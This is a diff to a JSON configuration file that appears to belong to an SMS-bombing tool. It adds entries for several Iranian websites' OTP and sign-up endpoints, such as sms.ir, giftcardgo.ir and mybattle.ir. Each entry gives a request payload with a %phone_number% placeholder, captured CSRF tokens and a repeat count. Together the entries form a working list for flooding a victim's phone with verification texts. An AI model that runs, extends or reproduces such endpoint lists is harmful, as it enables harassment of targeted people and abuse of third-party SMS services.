@@ -423,5 +423,54 @@
     "repeat": 5,
     "withOutZero": false,
     "payload": "digt_countrycode=%2B98&mobile%2Femail=%phone_number%&instance_id=851153ddb979d7da3a2aaeb293569e29&action=digits_forms_ajax&type=login&digits_step_1_type=&digits_step_1_value=&digits_step_2_type=&digits_step_2_value=&digits_step_3_type=&digits_step_3_value=&digits_login_email_token=&digits_redirect_page=%2F%2Fgiftmift.com%2Fmy-account%2F&digits_form=b0f432e8d8&action_type=phone&digits_phone=%phone_number%&digits_email=&digits_secured=1&woocommerce-login-nonce=103395072a&_wp_http_referer=%2Fmy-account%2F&digits_container_id=customer_login"
+  },
+  {
+    "name": "sms.ir",
+    "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
+    "method": "POST",
+    "repeat": 1,
+    "forceContentType": "application/json",
+    "withOutZero": true,
+    "payload": "%phone_number%"
+  },
+  {
+    "name": "giftcardgo",
+    "url": "https://giftcardgo.ir/wp-admin/admin-ajax.php",
+    "method": "POST",
+    "repeat": 5,
+    "withOutZero": true,
+    "payload": "action=digits_check_mob&countrycode=%2B98&mobileNo=%phone_number%&csrf=4b2dcada13&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=%phone_number%&digits_reg_password=hjfhfgdrghjgdrgg&dig_otp=&code=&dig_reg_mail=&dig_nounce=4b2dcada13"
+  },
+  {
+    "name": "dicardo",
+    "url": "https://dicardo.com/main/sendotp",
+    "method": "POST",
+    "repeat": 1,
+    "withOutZero": false,
+    "payload": "csrf_dicardo_name=&phone=%phone_number%&type=0&codmoaref="
+  },
+  {
+    "name": "game4sell",
+    "url": "https://www.game4sell.ir/register.php",
+    "method": "POST",
+    "repeat": 5,
+    "withOutZero": false,
+    "payload": "form=mobile&mobile=%phone_number%"
+  },
+  {
+    "name": "cdkeyshare",
+    "url": "https://www.cdkeyshare.ir/wp-admin/admin-ajax.php",
+    "method": "POST",
+    "repeat": 1,
+    "withOutZero": false,
+    "payload": "action=digits_check_mob&countrycode=%2B98&mobileNo=%phone_number%&csrf=4b64a23258&login=2&username=&email=drggdxhdhjh%40gmail.com&captcha=&captcha_ses=&json=1&whatsapp=0"
+  },
+  {
+    "name": "mybattle",
+    "url": "https://mybattle.ir/wp-admin/admin-ajax.php",
+    "method": "POST",
+    "repeat": 1,
+    "withOutZero": false,
+    "payload": "action=mreeir_send_sms&mobileemail=%phone_number%&userisnotauser=&type=mobile&security=e3656f4920"
   }
 ]
